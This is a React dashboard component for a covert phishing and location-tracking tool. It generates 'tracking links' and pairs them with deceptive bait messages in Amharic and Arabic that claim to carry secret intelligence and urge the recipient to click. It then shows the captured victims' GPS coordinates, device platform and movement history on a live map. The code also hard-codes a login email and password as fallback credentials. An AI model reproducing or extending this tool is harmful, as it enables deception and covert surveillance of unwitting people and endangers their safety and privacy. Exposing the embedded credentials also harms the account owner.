import React, { useState, useEffect } from 'react';
import { Target, Shield, Map as MapIcon, Users, Settings, Activity, Signal, Navigation, Link as LinkIcon, Globe, AlertTriangle } from 'lucide-react';
import { IntelligenceMap } from './IntelligenceMap';
import { db, auth, onSnapshot, collection, OperationType, handleFirestoreError, signInAnonymously, GoogleAuthProvider, signInWithPopup, signInWithEmailAndPassword } from '../lib/firebase';
import { motion, AnimatePresence } from 'motion/react';

interface TargetData {
  id: string;
  name: string;
  lat: number;
  lng: number;
  lastSeen: string;
  accuracy: number;
  status: 'active' | 'offline' | 'warning';
  platform?: string;
  history?: [number, number][];
}

export const AdminDashboard: React.FC = () => {
  const [targets, setTargets] = useState<TargetData[]>([]);
  const [selectedTargetId, setSelectedTargetId] = useState<string | undefined>();
  const [selectedLanguage, setSelectedLanguage] = useState<'amharic' | 'arabic' | 'both'>('amharic');
  const [time, setTime] = useState<string>('--:--:--');
  const [isClient, setIsClient] = useState(false);
  const [isAuthReady, setIsAuthReady] = useState(false);
  const [copyStatus, setCopyStatus] = useState<'idle' | 'copied'>('idle');
  const [errorMsg, setErrorMsg] = useState<string | null>(null);
  const [loginForm, setLoginForm] = useState({ email: '', password: '' });
  const [isLoggingIn, setIsLoggingIn] = useState(false);

  const [currentUser, setCurrentUser] = useState(auth.currentUser);
  const isAdminAuthenticated = currentUser && !currentUser.isAnonymous;

  useEffect(() => {
    setIsClient(true);
    // Initialize time on client only
    setTime(new Date().toLocaleTimeString());
    const timer = setInterval(() => setTime(new Date().toLocaleTimeString()), 1000);
    
    const initAuth = async () => {
      try {
        if (!auth.currentUser) {
          // Attempt anonymous session for initial read
          try {
            await signInAnonymously(auth);
          } catch (err: any) {
            if (err.code === 'auth/admin-restricted-operation') {
              // Anonymous auth is likely disabled in console, proceed to show login form
              console.log("Anonymous access restricted. Requiring admin credentials.");
            } else {
              throw err;
            }
          }
        }
        setIsAuthReady(true);
      } catch (err: any) {
        console.error("Dashboard session initialization failed:", err);
        if (err.code === 'auth/configuration-not-found') {
          setErrorMsg("SERVICE_ERROR: Authentication methods (Email/Password or Anonymous) are not enabled in the Firebase Console.");
        } else if (err.code === 'auth/admin-restricted-operation') {
          setIsAuthReady(true);
        } else {
          setErrorMsg(`SYSTEM_ERROR: ${err.message}`);
        }
      }
    };

    const unsubAuth = auth.onAuthStateChanged((user) => {
      setCurrentUser(user);
      if (user) {
        setIsAuthReady(true);
        setErrorMsg(null);
      } else {
        initAuth();
      }
    });

    return () => {
      clearInterval(timer);
      unsubAuth();
    };
  }, []);

  const handleAdminLogin = async () => {
    setIsLoggingIn(true);
    setErrorMsg(null);
    try {
      await signInWithEmailAndPassword(auth, loginForm.email || 'sendeqbuild@gmail.com', loginForm.password || 'Bi092714@');
    } catch (err: any) {
      console.error(err);
      if (err.code === 'auth/configuration-not-found') {
        setErrorMsg("Email/Password Auth is not enabled in Firebase Console.");
      } else {
        setErrorMsg(`Login Failed: ${err.message}`);
      }
      if (err.code === 'auth/operation-not-allowed') {
        setErrorMsg("ERROR: Configuration required. Please enable BOTH 'Email/Password' and 'Anonymous' auth providers in your Firebase Console Settings.");
      }
    } finally {
      setIsLoggingIn(false);
    }
  };

  const handleGoogleLogin = async () => {
    setErrorMsg(null);
    const provider = new GoogleAuthProvider();
    try {
      await signInWithPopup(auth, provider);
    } catch (err: any) {
      setErrorMsg(`Authorization Failed: ${err.message}`);
    }
  };

  useEffect(() => {
    if (!isAuthReady || !isAdminAuthenticated || !currentUser) {
      setTargets([]);
      return;
    }

    const unsub = onSnapshot(collection(db, 'targets'), (snapshot) => {
      const targetList: TargetData[] = [];
      snapshot.forEach(doc => {
        const data = doc.data();
        targetList.push({
          id: doc.id,
          name: data.name || 'Unknown Device',
          lat: data.lat || 0,
          lng: data.lng || 0,
          accuracy: data.accuracy || 0,
          lastSeen: data.lastSeen || new Date().toISOString(),
          status: data.status || 'offline',
          platform: data.platform,
          history: data.history
        });
      });
      setTargets(targetList);
    }, (error) => {
      // Gracefully handle permission errors if not admin yet
      if (error.message.includes('permission-denied')) {
        console.warn("Access Restricted: Operator privileges required.");
        return;
      }
      handleFirestoreError(error, OperationType.LIST, 'targets');
    });

    return () => unsub();
  }, [isAuthReady, isAdminAuthenticated]);

  const deployLink = () => {
    const langParam = selectedLanguage === 'both' ? 'both' : selectedLanguage;
    const url = `${window.location.origin}/track?lang=${langParam}`;
    navigator.clipboard.writeText(url);
    setCopyStatus('copied');
    setTimeout(() => setCopyStatus('idle'), 3000);
  };

  const selectedTarget = targets.find(t => t.id === selectedTargetId);

  return (
    <div className="bg-[#050608] text-slate-300 font-sans h-screen flex flex-col border-4 border-[#1a1c23] overflow-hidden">
      {/* Header */}
      <header className="h-16 border-b border-slate-800 bg-[#0a0c12] flex items-center justify-between px-6 shrink-0 shadow-lg">
        <div className="flex items-center gap-3">
          <div className="w-3 h-3 bg-red-500 rounded-full animate-pulse shadow-[0_0_10px_rgba(239,68,68,0.8)]"></div>
          <h1 className="text-xs font-mono tracking-[0.3em] text-slate-400 uppercase font-bold">Strategic Intelligence & Terrain Surveillance v8.4.2</h1>
        </div>
        <div className="flex gap-6 text-[10px] font-mono">
          <div className="text-emerald-500 font-bold bg-emerald-500/10 px-2 py-0.5 rounded border border-emerald-500/20">SECURE CONNECTION: ACTIVE</div>
          <div className="text-slate-500 uppercase flex items-center gap-2">
            <Globe className="w-3 h-3" />
            Sector 7 / HQ
          </div>
          <div className="text-slate-500 border-l border-slate-800 pl-6">{isClient ? time : '--:--:--'}</div>
        </div>
      </header>

      <main className="flex-1 flex overflow-hidden">
        {/* Left Sidebar: Target Link Engine */}
        <aside className="w-72 border-r border-slate-800 bg-[#07090e] p-4 flex flex-col gap-4 shrink-0 overflow-y-auto shadow-2xl">
          <div className="space-y-1">
            <label className="text-[10px] text-slate-500 uppercase font-bold tracking-widest px-1">Target Link Engine</label>
            <div className="bg-[#0d1117] border border-slate-800 rounded-lg p-4 space-y-4 shadow-inner">
              <div className="space-y-1">
                <div className="text-[9px] text-slate-500 uppercase font-bold">Transmission Language</div>
                <div className="flex gap-1">
                  {(['amharic', 'arabic', 'both'] as const).map(lang => (
                    <button
                      key={lang}
                      onClick={() => setSelectedLanguage(lang)}
                      className={`flex-1 text-[9px] py-1 rounded border uppercase font-bold transition-all ${
                        selectedLanguage === lang 
                          ? 'bg-blue-600 border-blue-500 text-white shadow-[0_0_8px_rgba(37,99,235,0.4)]' 
                          : 'bg-slate-900 border-slate-700 text-slate-500 hover:text-slate-300'
                      }`}
                    >
                      {lang}
                    </button>
                  ))}
                </div>
              </div>
              <div className="space-y-1">
                <div className="text-[9px] text-slate-500 uppercase font-bold">Select Bait Template</div>
                <select className="w-full bg-slate-900 border border-slate-700 text-[11px] p-2 rounded text-slate-300 focus:border-blue-500 outline-none transition-colors cursor-pointer">
                  <option>Urgent Security Update (Recommended)</option>
                  <option>Exclusive Content Reward</option>
                  <option>System Alert Notification</option>
                </select>
              </div>
              <div className="space-y-1">
                <div className="text-[9px] text-slate-500 uppercase font-bold">Bait Preview ({selectedLanguage.toUpperCase()})</div>
                <div className="bg-slate-950 p-3 border border-slate-800 rounded-lg shadow-inner max-h-32 overflow-y-auto custom-scrollbar">
                  {selectedLanguage === 'amharic' || selectedLanguage === 'both' ? (
                    <p className="text-[11px] leading-relaxed text-slate-300 font-medium italic mb-2">
                      "አስቸኳይ ምስጢራዊ መረጃ ስለአሁኑ ወቅታዊ መረጃ ነው በቀጥታ እንዳልልክልህ እንዳይታወቅብን ነዉ ቶሎ ብለህ በሊንኩ ግባና መረጃዉን እየዉ ለአንተ እንድልክ ትዕዛዝ ተሰጥቶኝ ነዉ... ሪፖርቱን ለማየት ከታች ያለውን ሊንክ ይጫን ቪድዮና ፎቶም በዉስጡ አለ ።"
                    </p>
                  ) : null}
                  {selectedLanguage === 'arabic' || selectedLanguage === 'both' ? (
                    <p className="text-[11px] leading-relaxed text-slate-300 font-medium italic dir-rtl text-right">
                      "معلومات سرية عاجلة بخصوص المعلومات الحالية، لم أرسلها لك مباشرة حتى لا نكتشف. ادخل الرابط بسرعة وشاهد المعلومات، لقد تلقيت أمراً بإرسالها لك... اضغط على الرابط أدناه لمشاهدة التقرير، هناك فيديو وصور بالداخل."
                    </p>
                  ) : null}
                  <div className="mt-2 text-center text-blue-500 font-mono font-black text-lg tracking-[0.3em]">8429</div>
                </div>
              </div>
              <button 
                onClick={deployLink}
                className={`w-full text-white text-[11px] py-2.5 rounded font-bold transition-all shadow-lg flex items-center justify-center gap-2 uppercase tracking-widest active:scale-95 ${
                  copyStatus === 'copied' ? 'bg-emerald-600' : 'bg-blue-600 hover:bg-blue-500'
                }`}
              >
                {copyStatus === 'copied' ? <Shield className="w-3.5 h-3.5" /> : <LinkIcon className="w-3.5 h-3.5" />}
                {copyStatus === 'copied' ? 'LINK COPIED' : 'GENERATE TRACKING LINK'}
              </button>
            </div>
          </div>

          <div className="flex-1 flex flex-col gap-2 overflow-hidden">
            <label className="text-[10px] text-slate-500 uppercase font-bold tracking-widest px-1">Active Signal Sessions</label>
            <div className="flex-1 overflow-y-auto space-y-2 pr-1 custom-scrollbar">
              {errorMsg && (
                <div className="p-3 border border-red-500/30 bg-red-500/5 rounded text-[10px] font-mono text-red-500 leading-relaxed uppercase flex flex-col gap-3">
                  <div className="flex items-center gap-2">
                    <AlertTriangle className="w-3 h-3" />
                    <span>Authentication Failure</span>
                  </div>
                  <p className="text-[9px] opacity-70 italic lowercase normal-case">{errorMsg}</p>
                </div>
              )}

              {!isAdminAuthenticated && (
                <div className="p-4 bg-slate-900/50 border border-slate-800 rounded-lg space-y-4">
                  <div className="text-[10px] text-slate-500 font-bold uppercase tracking-widest text-center border-b border-slate-800 pb-2 mb-2">Operator Login</div>
                  <div className="space-y-3">
                    <div className="space-y-1">
                      <label className="text-[9px] text-slate-500 uppercase">Email</label>
                      <input 
                        type="email" 
                        value={loginForm.email}
                        onChange={(e) => setLoginForm(prev => ({ ...prev, email: e.target.value }))}
                        placeholder="sendeqbuild@gmail.com"
                        className="w-full bg-slate-950 border border-slate-800 rounded p-2 text-[11px] text-slate-300 outline-none focus:border-blue-500"
                      />
                    </div>
                    <div className="space-y-1">
                      <label className="text-[9px] text-slate-500 uppercase">Access Code</label>
                      <input 
                        type="password" 
                        value={loginForm.password}
                        onChange={(e) => setLoginForm(prev => ({ ...prev, password: e.target.value }))}
                        placeholder="••••••••"
                        autoComplete="current-password"
                        className="w-full bg-slate-950 border border-slate-800 rounded p-2 text-[11px] text-slate-300 outline-none focus:border-blue-500"
                      />
                    </div>
                    <button 
                      onClick={handleAdminLogin}
                      disabled={isLoggingIn}
                      className="w-full py-2 bg-blue-600 hover:bg-blue-500 text-white rounded font-bold transition-all text-[10px] uppercase shadow-lg shadow-blue-900/20 disabled:opacity-50"
                    >
                      {isLoggingIn ? 'Verifying...' : 'Authenticate'}
                    </button>
                    <div className="relative py-2 flex items-center">
                      <div className="flex-1 border-t border-slate-800"></div>
                      <span className="px-2 text-[8px] text-slate-600 uppercase">OR</span>
                      <div className="flex-1 border-t border-slate-800"></div>
                    </div>
                    <button 
                      onClick={handleGoogleLogin}
                      className="w-full py-2 bg-slate-800 hover:bg-slate-700 text-slate-300 border border-slate-700 rounded font-bold transition-all text-[10px] flex items-center justify-center gap-2"
                    >
                      <Globe className="w-3 h-3" />
                      SIGN IN WITH GOOGLE
                    </button>
                  </div>
                </div>
              )}

              {isAdminAuthenticated && targets.length === 0 ? (
                <div className="py-20 text-center opacity-20 flex flex-col items-center gap-2">
                  <Signal className="w-8 h-8" />
                  <span className="text-[10px] font-mono">AWAITING TRANSMISSIONS...</span>
                </div>
              ) : (
                isAdminAuthenticated && targets.map(target => (
                  <motion.div 
                    layout
                    key={target.id}
                    onClick={() => setSelectedTargetId(target.id)}
                    className={`bg-[#0d1117] border-l-4 p-3 cursor-pointer transition-all hover:bg-[#161b22] ${
                      selectedTargetId === target.id ? 'border-red-500 bg-[#161b22] shadow-[0_0_15px_rgba(239,68,68,0.1)]' : 'border-emerald-500'
                    }`}
                  >
                    <div className="flex justify-between text-[10px] mb-1 font-mono">
                      <span className={target.status === 'active' ? 'text-emerald-400' : 'text-slate-500'}>
                        ID: {target.id.slice(0, 10).toUpperCase()}
                      </span>
                      <div className="flex gap-2 items-center">
                        {target.platform && (
                          <span className="bg-blue-900/40 text-blue-400 px-1.5 py-0.5 rounded-[2px] text-[8px] font-bold border border-blue-500/20">
                            {target.platform.toUpperCase()}
                          </span>
                        )}
                        <span className="text-slate-500 uppercase font-bold">{target.status}</span>
                      </div>
                    </div>
                    <div className="text-xs font-bold truncate text-slate-200">{target.name}</div>
                    <div className="text-[9px] text-slate-500 mt-2 font-mono flex justify-between uppercase">
                      <span>Lat: {target.lat.toFixed(4)}</span>
                      <span>Lng: {target.lng.toFixed(4)}</span>
                    </div>
                  </motion.div>
                ))
              )}
            </div>
          </div>
        </aside>

        {/* Center: Map */}
        <section className="flex-1 relative bg-[#020305] overflow-hidden">
          <IntelligenceMap 
            targets={targets.map(t => ({ 
              id: t.id, 
              name: t.name, 
              lat: t.lat, 
              lng: t.lng, 
              lastSeen: t.lastSeen,
              accuracy: t.accuracy,
              history: t.history
            }))} 
            selectedTargetId={selectedTargetId}
          />

          {/* Map Overlays */}
          <div className="absolute top-6 left-6 z-[1000] space-y-3 pointer-events-none">
            <div className="bg-[#0a0c12]/95 border border-slate-800 p-4 rounded-lg backdrop-blur-md shadow-[0_20px_50px_rgba(0,0,0,0.5)] border-l-4 border-l-emerald-500">
              <div className="text-[10px] text-slate-500 font-mono underline uppercase tracking-[0.2em] mb-2 opacity-60">Live Telemetry Feed</div>
              <div className="text-2xl font-mono text-emerald-400 tracking-tighter font-bold">
                {selectedTarget ? `${selectedTarget.lat.toFixed(6)}°N` : '0.000000°N'}
                <br />
                {selectedTarget ? `${selectedTarget.lng.toFixed(6)}°E` : '0.000000°E'}
              </div>
              <div className="text-[10px] text-slate-400 mt-2 flex items-center gap-2">
                <Navigation className="w-3 h-3 text-red-500" />
                Terrain: {selectedTarget ? 'Analyzed via Satellite' : 'Awaiting Signal...'}
              </div>
            </div>
            <div className="flex gap-2">
              <div className="bg-slate-900/90 border border-slate-700 px-3 py-1.5 rounded-full text-[9px] font-bold shadow-lg flex items-center gap-2">
                <div className="w-1.5 h-1.5 bg-blue-500 rounded-full"></div>
                PRECISION: {selectedTarget?.accuracy.toFixed(1) || '0.0'}m
              </div>
              <div className="bg-slate-900/90 border border-slate-700 px-3 py-1.5 rounded-full text-[9px] font-bold shadow-lg flex items-center gap-2">
                <div className={`w-1.5 h-1.5 rounded-full ${selectedTarget ? 'bg-emerald-500' : 'bg-slate-600'}`}></div>
                STATUS: {selectedTarget?.status.toUpperCase() || 'SCANNING'}
              </div>
            </div>
          </div>
        </section>

        {/* Right Sidebar: Intelligence */}
        <aside className="w-64 border-l border-slate-800 bg-[#07090e] p-4 shrink-0 flex flex-col gap-6 overflow-y-auto shadow-[-20px_0_50px_rgba(0,0,0,0.5)]">
          <div className="bg-[#0d1117] border border-slate-800 rounded-lg overflow-hidden shrink-0 shadow-inner">
            <div className="bg-slate-800/50 p-2 text-[10px] font-bold tracking-widest uppercase border-b border-slate-800">Live Motion Detection</div>
            <div className="h-32 flex items-center justify-center bg-black relative">
              <div className="absolute inset-0 bg-green-950/10" style={{ backgroundImage: 'repeating-linear-gradient(0deg, transparent, transparent 1px, rgba(0,255,0,0.03) 1px, rgba(0,255,0,0.03) 2px)', backgroundSize: '100% 2px' }}></div>
              <div className="text-emerald-500 font-mono text-[9px] animate-pulse flex flex-col items-center gap-2">
                <Activity className="w-5 h-5 text-emerald-500/50" />
                <span className="tracking-widest">SCANNING...</span>
              </div>
            </div>
          </div>

          <div className="flex-1 space-y-6">
            <div className="space-y-2">
              <div className="text-[10px] text-slate-500 uppercase tracking-[0.2em] font-bold px-1">Environmental Intel</div>
              <div className="space-y-4 bg-[#0d1117] p-4 border border-slate-800 rounded-lg shadow-inner">
                <div className="space-y-2">
                  <div className="flex justify-between text-[10px] font-mono">
                    <span className="uppercase opacity-60">Vegetation Density</span>
                    <span className="text-emerald-400 font-bold">82%</span>
                  </div>
                  <div className="w-full bg-slate-800 h-1 rounded-full overflow-hidden">
                    <motion.div initial={{ width: 0 }} animate={{ width: '82%' }} className="h-full bg-emerald-500 shadow-[0_0_8px_#10b981]"></motion.div>
                  </div>
                </div>
                <div className="space-y-2">
                  <div className="flex justify-between text-[10px] font-mono">
                    <span className="uppercase opacity-60">Signal Strength</span>
                    <span className="text-amber-400 font-bold">24%</span>
                  </div>
                  <div className="w-full bg-slate-800 h-1 rounded-full overflow-hidden">
                    <motion.div initial={{ width: 0 }} animate={{ width: '24%' }} className="h-full bg-amber-500 shadow-[0_0_8px_#f59e0b]"></motion.div>
                  </div>
                </div>
              </div>
            </div>

            <div className="bg-blue-900/10 border border-blue-500/20 p-4 rounded-xl relative overflow-hidden backdrop-blur-sm">
              <div className="absolute top-0 right-0 p-2 opacity-10">
                <Shield className="w-8 h-8" />
              </div>
              <div className="text-[10px] text-blue-400 font-bold mb-2 italic uppercase tracking-widest flex items-center gap-2">
                <div className="w-1 h-1 bg-blue-500 rounded-full"></div>
                Directive:
              </div>
              <p className="text-[10px] leading-relaxed text-slate-400 italic">
                Ensuring peace and national security via persistent terrain monitoring. Authorized personnel only.
              </p>
            </div>

            <div className="space-y-4">
               <div className="text-[10px] text-slate-500 uppercase tracking-[0.2em] font-bold px-1">Sat Link Status</div>
               <div className="grid grid-cols-2 gap-2">
                  <div className="bg-slate-900/50 border border-slate-800 p-2 rounded flex flex-col items-center">
                    <p className="text-[8px] text-slate-500 opacity-50">S_PING</p>
                    <p className="text-[11px] font-mono text-emerald-500 font-bold">12ms</p>
                  </div>
                  <div className="bg-slate-900/50 border border-slate-800 p-2 rounded flex flex-col items-center">
                    <p className="text-[8px] text-slate-500 opacity-50">ATM_INT</p>
                    <p className="text-[11px] font-mono text-blue-400 font-bold">98%</p>
                  </div>
               </div>
            </div>
          </div>
        </aside>
      </main>

      <footer className="h-8 border-t border-slate-800 bg-[#0a0c12] flex items-center px-4 justify-between shrink-0 font-mono text-[9px] text-slate-600 tracking-widest uppercase">
        <div className="flex items-center gap-4">
          <span className="animate-pulse">●</span>
          <span>SYSTEM STATUS: NOMINAL</span>
          <span className="opacity-30">|</span>
          <span>ENCRYPTION: AES-256</span>
        </div>
        <div>OPERATOR: {selectedTargetId ? `TP_${selectedTargetId.slice(0,6).toUpperCase()}` : 'EAGLE_01'}</div>
      </footer>
    </div>
  );
};
